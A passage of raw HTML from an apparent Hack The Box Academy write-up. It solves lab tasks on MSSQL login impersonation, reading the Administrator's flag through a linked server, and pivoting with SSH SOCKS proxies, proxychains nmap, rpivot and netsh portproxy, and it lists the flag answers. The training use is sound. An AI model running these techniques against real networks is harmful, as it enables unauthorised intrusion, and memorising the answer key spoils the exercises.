</span><span id="__span-223-5"><a id="__codelineno-223-5" name="__codelineno-223-5"></a>cd Fiona
</span><span id="__span-223-6"><a id="__codelineno-223-6" name="__codelineno-223-6"></a>get creds.txt
</span><span id="__span-223-7"><a id="__codelineno-223-7" name="__codelineno-223-7"></a>quit
</span><span id="__span-223-8"><a id="__codelineno-223-8" name="__codelineno-223-8"></a>
</span><span id="__span-223-9"><a id="__codelineno-223-9" name="__codelineno-223-9"></a>cat creds.txt
</span><span id="__span-223-10"><a id="__codelineno-223-10" name="__codelineno-223-10"></a>#Try with all creds and see that &quot;48Ns72!bns74@S84NNNSl&quot; works for:
</span><span id="__span-223-11"><a id="__codelineno-223-11" name="__codelineno-223-11"></a>smbclient  \\\\$ip\\Home -U fiona 
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>48Ns72!bns74@S84NNNSl</code></p>
<p>Once logged in, what other user can we compromise to gain admin privileges?</p>
<p>Results: John</p>
<p>Submit the contents of the flag.txt file on the Administrator Desktop.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-224-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-224-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-224-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-224-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-224-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-224-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-224-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-224-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-224-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-224-10">10</a></span>
<span class="normal"><a href="#__codelineno-224-11">11</a></span>
<span class="normal"><a href="#__codelineno-224-12">12</a></span>
<span class="normal"><a href="#__codelineno-224-13">13</a></span>
<span class="normal"><a href="#__codelineno-224-14">14</a></span>
<span class="normal"><a href="#__codelineno-224-15">15</a></span>
<span class="normal"><a href="#__codelineno-224-16">16</a></span>
<span class="normal"><a href="#__codelineno-224-17">17</a></span>
<span class="normal"><a href="#__codelineno-224-18">18</a></span>
<span class="normal"><a href="#__codelineno-224-19">19</a></span>
<span class="normal"><a href="#__codelineno-224-20">20</a></span>
<span class="normal"><a href="#__codelineno-224-21">21</a></span>
<span class="normal"><a href="#__codelineno-224-22">22</a></span>
<span class="normal"><a href="#__codelineno-224-23">23</a></span>
<span class="normal"><a href="#__codelineno-224-24">24</a></span>
<span class="normal"><a href="#__codelineno-224-25">25</a></span>
<span class="normal"><a href="#__codelineno-224-26">26</a></span>
<span class="normal"><a href="#__codelineno-224-27">27</a></span>
<span class="normal"><a href="#__codelineno-224-28">28</a></span>
<span class="normal"><a href="#__codelineno-224-29">29</a></span>
<span class="normal"><a href="#__codelineno-224-30">30</a></span>
<span class="normal"><a href="#__codelineno-224-31">31</a></span>
<span class="normal"><a href="#__codelineno-224-32">32</a></span>
<span class="normal"><a href="#__codelineno-224-33">33</a></span>
<span class="normal"><a href="#__codelineno-224-34">34</a></span>
<span class="normal"><a href="#__codelineno-224-35">35</a></span>
<span class="normal"><a href="#__codelineno-224-36">36</a></span>
<span class="normal"><a href="#__codelineno-224-37">37</a></span>
<span class="normal"><a href="#__codelineno-224-38">38</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-224-1"><a id="__codelineno-224-1" name="__codelineno-224-1"></a>rdesktop -u Fiona -p &#39;48Ns72!bns74@S84NNNSl&#39; $ip
</span><span id="__span-224-2"><a id="__codelineno-224-2" name="__codelineno-224-2"></a>
</span><span id="__span-224-3"><a id="__codelineno-224-3" name="__codelineno-224-3"></a># Open Powershell
</span><span id="__span-224-4"><a id="__codelineno-224-4" name="__codelineno-224-4"></a>sqlcmd
</span><span id="__span-224-5"><a id="__codelineno-224-5" name="__codelineno-224-5"></a>
</span><span id="__span-224-6"><a id="__codelineno-224-6" name="__codelineno-224-6"></a># List databases
</span><span id="__span-224-7"><a id="__codelineno-224-7" name="__codelineno-224-7"></a>1&gt; SELECT name FROM master.dbo.sysdatabases
</span><span id="__span-224-8"><a id="__codelineno-224-8" name="__codelineno-224-8"></a>2&gt; go
</span><span id="__span-224-9"><a id="__codelineno-224-9" name="__codelineno-224-9"></a># Enumerate DB and nothing interesting comes out
</span><span id="__span-224-10"><a id="__codelineno-224-10" name="__codelineno-224-10"></a>
</span><span id="__span-224-11"><a id="__codelineno-224-11" name="__codelineno-224-11"></a># Verify if our current user has the sysadmin role:
</span><span id="__span-224-12"><a id="__codelineno-224-12" name="__codelineno-224-12"></a>SELECT SYSTEM_USER
</span><span id="__span-224-13"><a id="__codelineno-224-13" name="__codelineno-224-13"></a>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
</span><span id="__span-224-14"><a id="__codelineno-224-14" name="__codelineno-224-14"></a>go
</span><span id="__span-224-15"><a id="__codelineno-224-15" name="__codelineno-224-15"></a>#  value 0 indicates no sysadmin role, value 1 is sysadmin role. Fiona has no sysadminrole
</span><span id="__span-224-16"><a id="__codelineno-224-16" name="__codelineno-224-16"></a>
</span><span id="__span-224-17"><a id="__codelineno-224-17" name="__codelineno-224-17"></a>
</span><span id="__span-224-18"><a id="__codelineno-224-18" name="__codelineno-224-18"></a># Identify Users that we Can Impersonate
</span><span id="__span-224-19"><a id="__codelineno-224-19" name="__codelineno-224-19"></a>SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39; 
</span><span id="__span-224-20"><a id="__codelineno-224-20" name="__codelineno-224-20"></a>go
</span><span id="__span-224-21"><a id="__codelineno-224-21" name="__codelineno-224-21"></a>
</span><span id="__span-224-22"><a id="__codelineno-224-22" name="__codelineno-224-22"></a># As a result we can see john. Let&#39;s impersonate him and verify if hjohn has sysadmin role
</span><span id="__span-224-23"><a id="__codelineno-224-23" name="__codelineno-224-23"></a>EXECUTE AS LOGIN = &#39;john&#39;;  
</span><span id="__span-224-24"><a id="__codelineno-224-24" name="__codelineno-224-24"></a>SELECT SYSTEM_USER;  
</span><span id="__span-224-25"><a id="__codelineno-224-25" name="__codelineno-224-25"></a>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);  
</span><span id="__span-224-26"><a id="__codelineno-224-26" name="__codelineno-224-26"></a>go
</span><span id="__span-224-27"><a id="__codelineno-224-27" name="__codelineno-224-27"></a>
</span><span id="__span-224-28"><a id="__codelineno-224-28" name="__codelineno-224-28"></a># No sysadmin role for john
</span><span id="__span-224-29"><a id="__codelineno-224-29" name="__codelineno-224-29"></a>
</span><span id="__span-224-30"><a id="__codelineno-224-30" name="__codelineno-224-30"></a>
</span><span id="__span-224-31"><a id="__codelineno-224-31" name="__codelineno-224-31"></a># Identify linked Servers in MSSQL
</span><span id="__span-224-32"><a id="__codelineno-224-32" name="__codelineno-224-32"></a>SELECT srvname, isremote FROM sysservers
</span><span id="__span-224-33"><a id="__codelineno-224-33" name="__codelineno-224-33"></a>go
</span><span id="__span-224-34"><a id="__codelineno-224-34" name="__codelineno-224-34"></a>
</span><span id="__span-224-35"><a id="__codelineno-224-35" name="__codelineno-224-35"></a># As response we have
</span><span id="__span-224-36"><a id="__codelineno-224-36" name="__codelineno-224-36"></a># WINSRV02\SQLEXPRESS                                         # LOCAL.TEST.LINKED.SRV                                                                                                     
</span><span id="__span-224-37"><a id="__codelineno-224-37" name="__codelineno-224-37"></a># We can read files from that connection in local
</span><span id="__span-224-38"><a id="__codelineno-224-38" name="__codelineno-224-38"></a>execute (&#39;select * from OPENROWSET(BULK &#39;&#39;C:/Users/Administrator/desktop/flag.txt&#39;&#39;, SINGLE_CLOB) AS Contents&#39;) at [local.test.linked.srv]; 
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>HTB{46u$!n9_l!nk3d_$3rv3r$}</code> </p>
<h2 id="pivoting-tunneling-and-port-forwarding"><a href="https://academy.hackthebox.com/module/details/158">Pivoting, Tunneling, and Port Forwarding</a></h2>
<h3 id="introduction">Introduction</h3>
<p><strong>Reference the Using ifconfig output in the section reading. Which NIC is assigned a public IP address?</strong></p>
<p>Results: eth0</p>
<p><strong>Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for a host with the IP address of 10.129.10.25, out of which NIC will the packet be forwarded?</strong></p>
<p>Results: tun0</p>
<p><strong>Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for www.hackthebox.com what is the IP address of the gateway it will be sent to?</strong></p>
<p>Results: 178.62.64.1</p>
<h3 id="choosing-the-dig-site-starting-our-tunnels">Choosing The Dig Site &amp; Starting Our Tunnels</h3>
<p>SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"
You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-225-1">1</a></span>
<span class="normal"><a href="#__codelineno-225-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-225-1"><a id="__codelineno-225-1" name="__codelineno-225-1"></a>ssh ubuntu@$ip -D 1234
</span><span id="__span-225-2"><a id="__codelineno-225-2" name="__codelineno-225-2"></a>ip a
</span></code></pre></div></td></tr></table></div>
<p>Results: 3</p>
<p>Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-226-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-226-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-226-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-226-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-226-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-226-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-226-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-226-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-226-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-226-10">10</a></span>
<span class="normal"><a href="#__codelineno-226-11">11</a></span>
<span class="normal"><a href="#__codelineno-226-12">12</a></span>
<span class="normal"><a href="#__codelineno-226-13">13</a></span>
<span class="normal"><a href="#__codelineno-226-14">14</a></span>
<span class="normal"><a href="#__codelineno-226-15">15</a></span>
<span class="normal"><a href="#__codelineno-226-16">16</a></span>
<span class="normal"><a href="#__codelineno-226-17">17</a></span>
<span class="normal"><a href="#__codelineno-226-18">18</a></span>
<span class="normal"><a href="#__codelineno-226-19">19</a></span>
<span class="normal"><a href="#__codelineno-226-20">20</a></span>
<span class="normal"><a href="#__codelineno-226-21">21</a></span>
<span class="normal"><a href="#__codelineno-226-22">22</a></span>
<span class="normal"><a href="#__codelineno-226-23">23</a></span>
<span class="normal"><a href="#__codelineno-226-24">24</a></span>
<span class="normal"><a href="#__codelineno-226-25">25</a></span>
<span class="normal"><a href="#__codelineno-226-26">26</a></span>
<span class="normal"><a href="#__codelineno-226-27">27</a></span>
<span class="normal"><a href="#__codelineno-226-28">28</a></span>
<span class="normal"><a href="#__codelineno-226-29">29</a></span>
<span class="normal"><a href="#__codelineno-226-30">30</a></span>
<span class="normal"><a href="#__codelineno-226-31">31</a></span>
<span class="normal"><a href="#__codelineno-226-32">32</a></span>
<span class="normal"><a href="#__codelineno-226-33">33</a></span>
<span class="normal"><a href="#__codelineno-226-34">34</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-226-1"><a id="__codelineno-226-1" name="__codelineno-226-1"></a># Configure proxychains.
</span><span id="__span-226-2"><a id="__codelineno-226-2" name="__codelineno-226-2"></a>sudo nano /etc/proxychains4.conf
</span><span id="__span-226-3"><a id="__codelineno-226-3" name="__codelineno-226-3"></a># Adding the last line: socks5 127.0.0.1 1234
</span><span id="__span-226-4"><a id="__codelineno-226-4" name="__codelineno-226-4"></a>
</span><span id="__span-226-5"><a id="__codelineno-226-5" name="__codelineno-226-5"></a># Set the dynamic port:
</span><span id="__span-226-6"><a id="__codelineno-226-6" name="__codelineno-226-6"></a>ssh ubuntu@$ip -D 1234 
</span><span id="__span-226-7"><a id="__codelineno-226-7" name="__codelineno-226-7"></a># Scan the NIC in the connection
</span><span id="__span-226-8"><a id="__codelineno-226-8" name="__codelineno-226-8"></a>ip a
</span><span id="__span-226-9"><a id="__codelineno-226-9" name="__codelineno-226-9"></a>
</span><span id="__span-226-10"><a id="__codelineno-226-10" name="__codelineno-226-10"></a># Open a different terminal and run a nmap on the network range to discover ips (another network) from the victim&#39;s
</span><span id="__span-226-11"><a id="__codelineno-226-11" name="__codelineno-226-11"></a>proxychains nmap -v -sT -Pn 172.16.5.1-255
</span><span id="__span-226-12"><a id="__codelineno-226-12" name="__codelineno-226-12"></a>
</span><span id="__span-226-13"><a id="__codelineno-226-13" name="__codelineno-226-13"></a># In the results you will see 172.16.5.19. Now run a nmap on that ip
</span><span id="__span-226-14"><a id="__codelineno-226-14" name="__codelineno-226-14"></a>proxychains nmap -v -sT -Pn 172.16.5.19
</span><span id="__span-226-15"><a id="__codelineno-226-15" name="__codelineno-226-15"></a># Open ports: 
</span><span id="__span-226-16"><a id="__codelineno-226-16" name="__codelineno-226-16"></a># 53/tcp   open  domain
</span><span id="__span-226-17"><a id="__codelineno-226-17" name="__codelineno-226-17"></a># 80/tcp   open  http
</span><span id="__span-226-18"><a id="__codelineno-226-18" name="__codelineno-226-18"></a># 88/tcp   open  kerberos-sec
</span><span id="__span-226-19"><a id="__codelineno-226-19" name="__codelineno-226-19"></a># 135/tcp  open  msrpc
</span><span id="__span-226-20"><a id="__codelineno-226-20" name="__codelineno-226-20"></a># 139/tcp  open  netbios-ssn
</span><span id="__span-226-21"><a id="__codelineno-226-21" name="__codelineno-226-21"></a># 389/tcp  open  ldap
</span><span id="__span-226-22"><a id="__codelineno-226-22" name="__codelineno-226-22"></a># 445/tcp  open  microsoft-ds
</span><span id="__span-226-23"><a id="__codelineno-226-23" name="__codelineno-226-23"></a># 464/tcp  open  kpasswd5
</span><span id="__span-226-24"><a id="__codelineno-226-24" name="__codelineno-226-24"></a># 593/tcp  open  http-rpc-epmap
</span><span id="__span-226-25"><a id="__codelineno-226-25" name="__codelineno-226-25"></a># 636/tcp  open  ldapssl
</span><span id="__span-226-26"><a id="__codelineno-226-26" name="__codelineno-226-26"></a># 3268/tcp open  globalcatLDAP
</span><span id="__span-226-27"><a id="__codelineno-226-27" name="__codelineno-226-27"></a># 3269/tcp open  globalcatLDAPssl
</span><span id="__span-226-28"><a id="__codelineno-226-28" name="__codelineno-226-28"></a># 3389/tcp open  ms-wbt-server
</span><span id="__span-226-29"><a id="__codelineno-226-29" name="__codelineno-226-29"></a>
</span><span id="__span-226-30"><a id="__codelineno-226-30" name="__codelineno-226-30"></a># In a different terminal
</span><span id="__span-226-31"><a id="__codelineno-226-31" name="__codelineno-226-31"></a>export user=&quot;victor&quot;
</span><span id="__span-226-32"><a id="__codelineno-226-32" name="__codelineno-226-32"></a>export pass=&quot;pass@123&quot; 
</span><span id="__span-226-33"><a id="__codelineno-226-33" name="__codelineno-226-33"></a>proxychains xfreerdp  /u:$user /p:$pass /v:172.16.5.19
</span><span id="__span-226-34"><a id="__codelineno-226-34" name="__codelineno-226-34"></a># And you will get a RDP connection. Open the flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: N1c3Piv0t</p>
<p><strong>SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"</strong>
<strong>Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-227-1">1</a></span>
<span class="normal"><a href="#__codelineno-227-2">2</a></span>
<span class="normal"><a href="#__codelineno-227-3">3</a></span>
<span class="normal"><a href="#__codelineno-227-4">4</a></span>
<span class="normal"><a href="#__codelineno-227-5">5</a></span>
<span class="normal"><a href="#__codelineno-227-6">6</a></span>
<span class="normal"><a href="#__codelineno-227-7">7</a></span>
<span class="normal"><a href="#__codelineno-227-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-227-1"><a id="__codelineno-227-1" name="__codelineno-227-1"></a># Configure proxychains.
</span><span id="__span-227-2"><a id="__codelineno-227-2" name="__codelineno-227-2"></a>sudo nano /etc/proxychains4.conf
</span><span id="__span-227-3"><a id="__codelineno-227-3" name="__codelineno-227-3"></a># Adding the last line: socks5 127.0.0.1 1234
</span><span id="__span-227-4"><a id="__codelineno-227-4" name="__codelineno-227-4"></a>
</span><span id="__span-227-5"><a id="__codelineno-227-5" name="__codelineno-227-5"></a># Set the dynamic port:
</span><span id="__span-227-6"><a id="__codelineno-227-6" name="__codelineno-227-6"></a>ssh ubuntu@$ip -D 1234 
</span><span id="__span-227-7"><a id="__codelineno-227-7" name="__codelineno-227-7"></a># Scan the NIC in the connection
</span><span id="__span-227-8"><a id="__codelineno-227-8" name="__codelineno-227-8"></a>ip a
</span></code></pre></div></td></tr></table></div>
<p>Results: 172.16.5.129</p>
<p><strong>What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)</strong></p>
<p>Results: 0.0.0.0</p>
<p><strong>What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-228-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-228-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-228-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-228-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-228-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-228-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-228-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-228-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-228-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-228-10">10</a></span>
<span class="normal"><a href="#__codelineno-228-11">11</a></span>
<span class="normal"><a href="#__codelineno-228-12">12</a></span>
<span class="normal"><a href="#__codelineno-228-13">13</a></span>
<span class="normal"><a href="#__codelineno-228-14">14</a></span>
<span class="normal"><a href="#__codelineno-228-15">15</a></span>
<span class="normal"><a href="#__codelineno-228-16">16</a></span>
<span class="normal"><a href="#__codelineno-228-17">17</a></span>
<span class="normal"><a href="#__codelineno-228-18">18</a></span>
<span class="normal"><a href="#__codelineno-228-19">19</a></span>
<span class="normal"><a href="#__codelineno-228-20">20</a></span>
<span class="normal"><a href="#__codelineno-228-21">21</a></span>
<span class="normal"><a href="#__codelineno-228-22">22</a></span>
<span class="normal"><a href="#__codelineno-228-23">23</a></span>
<span class="normal"><a href="#__codelineno-228-24">24</a></span>
<span class="normal"><a href="#__codelineno-228-25">25</a></span>
<span class="normal"><a href="#__codelineno-228-26">26</a></span>
<span class="normal"><a href="#__codelineno-228-27">27</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-228-1"><a id="__codelineno-228-1" name="__codelineno-228-1"></a># Configure proxychains.
</span><span id="__span-228-2"><a id="__codelineno-228-2" name="__codelineno-228-2"></a>sudo nano /etc/proxychains4.conf
</span><span id="__span-228-3"><a id="__codelineno-228-3" name="__codelineno-228-3"></a># Adding the last line: socks5 127.0.0.1 1234
</span><span id="__span-228-4"><a id="__codelineno-228-4" name="__codelineno-228-4"></a>
</span><span id="__span-228-5"><a id="__codelineno-228-5" name="__codelineno-228-5"></a># Set the dynamic port:
</span><span id="__span-228-6"><a id="__codelineno-228-6" name="__codelineno-228-6"></a>ssh ubuntu@$ip -D 1234 
</span><span id="__span-228-7"><a id="__codelineno-228-7" name="__codelineno-228-7"></a># Scan the NIC in the connection
</span><span id="__span-228-8"><a id="__codelineno-228-8" name="__codelineno-228-8"></a>ip a
</span><span id="__span-228-9"><a id="__codelineno-228-9" name="__codelineno-228-9"></a>
</span><span id="__span-228-10"><a id="__codelineno-228-10" name="__codelineno-228-10"></a># Open a different terminal and run a nmap on the network range to discover ips (another network) from the victim&#39;s
</span><span id="__span-228-11"><a id="__codelineno-228-11" name="__codelineno-228-11"></a>proxychains nmap -v -sT -Pn 172.16.5.1-255
</span><span id="__span-228-12"><a id="__codelineno-228-12" name="__codelineno-228-12"></a>
</span><span id="__span-228-13"><a id="__codelineno-228-13" name="__codelineno-228-13"></a># In the results you will see 172.16.5.19. Now run a nmap on that ip
</span><span id="__span-228-14"><a id="__codelineno-228-14" name="__codelineno-228-14"></a># Open ports: 
</span><span id="__span-228-15"><a id="__codelineno-228-15" name="__codelineno-228-15"></a># 53/tcp   open  domain
</span><span id="__span-228-16"><a id="__codelineno-228-16" name="__codelineno-228-16"></a># 80/tcp   open  http
</span><span id="__span-228-17"><a id="__codelineno-228-17" name="__codelineno-228-17"></a># 88/tcp   open  kerberos-sec
</span><span id="__span-228-18"><a id="__codelineno-228-18" name="__codelineno-228-18"></a># 135/tcp  open  msrpc
</span><span id="__span-228-19"><a id="__codelineno-228-19" name="__codelineno-228-19"></a># 139/tcp  open  netbios-ssn
</span><span id="__span-228-20"><a id="__codelineno-228-20" name="__codelineno-228-20"></a># 389/tcp  open  ldap
</span><span id="__span-228-21"><a id="__codelineno-228-21" name="__codelineno-228-21"></a># 445/tcp  open  microsoft-ds
</span><span id="__span-228-22"><a id="__codelineno-228-22" name="__codelineno-228-22"></a># 464/tcp  open  kpasswd5
</span><span id="__span-228-23"><a id="__codelineno-228-23" name="__codelineno-228-23"></a># 593/tcp  open  http-rpc-epmap
</span><span id="__span-228-24"><a id="__codelineno-228-24" name="__codelineno-228-24"></a># 636/tcp  open  ldapssl
</span><span id="__span-228-25"><a id="__codelineno-228-25" name="__codelineno-228-25"></a># 3268/tcp open  globalcatLDAP
</span><span id="__span-228-26"><a id="__codelineno-228-26" name="__codelineno-228-26"></a># 3269/tcp open  globalcatLDAPssl
</span><span id="__span-228-27"><a id="__codelineno-228-27" name="__codelineno-228-27"></a># 3389/tcp open  ms-wbt-server
</span></code></pre></div></td></tr></table></div>
<p>Results: 172.16.5.19,172.16.5.129</p>
<p><strong>Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)</strong></p>
<p>Results: 172.16.5.0/255.255.254.0 via 10.129.202.64</p>
<h3 id="playing-pong-with-socat">Playing Pong with Socat</h3>
<p><strong>SSH tunneling is required with Socat. True or False?</strong></p>
<p>Results: False</p>
<p><strong>What Meterpreter payload did we use to catch the bind shell session? (Submit the full path as the answer)</strong></p>
<p>Results: windows/x64/meterpreter/bind_tcp</p>
<h3 id="pivoting-around-obstacles">Pivoting Around Obstacles</h3>
<p><strong>From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.</strong></p>
<p>Results: Attack Host</p>
<p><strong>From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.</strong></p>
<p>Results: Pivot Host</p>
<p><strong>SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!". Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-229-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-229-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-229-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-229-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-229-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-229-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-229-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-229-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-229-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-229-10">10</a></span>
<span class="normal"><a href="#__codelineno-229-11">11</a></span>
<span class="normal"><a href="#__codelineno-229-12">12</a></span>
<span class="normal"><a href="#__codelineno-229-13">13</a></span>
<span class="normal"><a href="#__codelineno-229-14">14</a></span>
<span class="normal"><a href="#__codelineno-229-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-229-1"><a id="__codelineno-229-1" name="__codelineno-229-1"></a># Kali, terminal 1, copy the rpivot folder and run the server 
</span><span id="__span-229-2"><a id="__codelineno-229-2" name="__codelineno-229-2"></a>scp -r rpivot ubuntu@$UbuntuIP:/home/ubuntu/
</span><span id="__span-229-3"><a id="__codelineno-229-3" name="__codelineno-229-3"></a>cd rpivot/ 
</span><span id="__span-229-4"><a id="__codelineno-229-4" name="__codelineno-229-4"></a>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
</span><span id="__span-229-5"><a id="__codelineno-229-5" name="__codelineno-229-5"></a>
</span><span id="__span-229-6"><a id="__codelineno-229-6" name="__codelineno-229-6"></a># Kali, terminal 2, connect to the ubuntu machine and run the rpivot client
</span><span id="__span-229-7"><a id="__codelineno-229-7" name="__codelineno-229-7"></a>ssh ubuntu@$ip
</span><span id="__span-229-8"><a id="__codelineno-229-8" name="__codelineno-229-8"></a>cd rpivot/
</span><span id="__span-229-9"><a id="__codelineno-229-9" name="__codelineno-229-9"></a>python2.7 client.py --server-ip $KaliIP --server-port 9999
</span><span id="__span-229-10"><a id="__codelineno-229-10" name="__codelineno-229-10"></a>
</span><span id="__span-229-11"><a id="__codelineno-229-11" name="__codelineno-229-11"></a># Kali, terminal 3, edit proxychains4.conf file and add the line &#39; sock4 127.0.0.1 9050&#39; at the last line
</span><span id="__span-229-12"><a id="__codelineno-229-12" name="__codelineno-229-12"></a>sudo nano /etc/proxychains4.conf  
</span><span id="__span-229-13"><a id="__codelineno-229-13" name="__codelineno-229-13"></a>
</span><span id="__span-229-14"><a id="__codelineno-229-14" name="__codelineno-229-14"></a># Kali, terminal 3, connect to the internal web server:
</span><span id="__span-229-15"><a id="__codelineno-229-15" name="__codelineno-229-15"></a>proxychains firefox-esr $ipWebServer
</span></code></pre></div></td></tr></table></div>
<p>Results: I_L0v3_Pr0xy_Ch@ins</p>
<p>RDP to $ip  with user "htb-student" and password "HTB_@cademy_stdnt!". Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-230-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-230-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-230-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-230-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-230-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-230-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-230-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-230-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-230-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-230-10">10</a></span>
<span class="normal"><a href="#__codelineno-230-11">11</a></span>
<span class="normal"><a href="#__codelineno-230-12">12</a></span>
<span class="normal"><a href="#__codelineno-230-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-230-1"><a id="__codelineno-230-1" name="__codelineno-230-1"></a># From kali, terminal 1, connect to the windows machine
</span><span id="__span-230-2"><a id="__codelineno-230-2" name="__codelineno-230-2"></a>xfreerdp  /u:&quot;htb-student&quot; /p:&quot;HTB_@cademy_stdnt\!&quot; /v:$ipWindows
</span><span id="__span-230-3"><a id="__codelineno-230-3" name="__codelineno-230-3"></a>
</span><span id="__span-230-4"><a id="__codelineno-230-4" name="__codelineno-230-4"></a># Run Powershell as Administrator and execute:
</span><span id="__span-230-5"><a id="__codelineno-230-5" name="__codelineno-230-5"></a>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=$IpInterface1Windows connectport=3389 connectaddress=$IpInterface2Windows
</span><span id="__span-230-6"><a id="__codelineno-230-6" name="__codelineno-230-6"></a>
</span><span id="__span-230-7"><a id="__codelineno-230-7" name="__codelineno-230-7"></a># Make sure the connection is saved
</span><span id="__span-230-8"><a id="__codelineno-230-8" name="__codelineno-230-8"></a>netsh.exe interface portproxy show v4tov4
</span><span id="__span-230-9"><a id="__codelineno-230-9" name="__codelineno-230-9"></a>
</span><span id="__span-230-10"><a id="__codelineno-230-10" name="__codelineno-230-10"></a># From kali, terminal 2, connect to the Target:
</span><span id="__span-230-11"><a id="__codelineno-230-11" name="__codelineno-230-11"></a>xfreerdp  /u:victor /p:pass@123 /v:$IpInterface1Windows:8080
</span><span id="__span-230-12"><a id="__codelineno-230-12" name="__codelineno-230-12"></a>
</span><span id="__span-230-13"><a id="__codelineno-230-13" name="__codelineno-230-13"></a># Browse to the file and capture the flag
</span></code></pre></div></td></tr></table></div>
<p>Results: Jim Flipflop</p>
<h3 id="branching-out-our-tunn">Branching Out Our Tunn</h3>
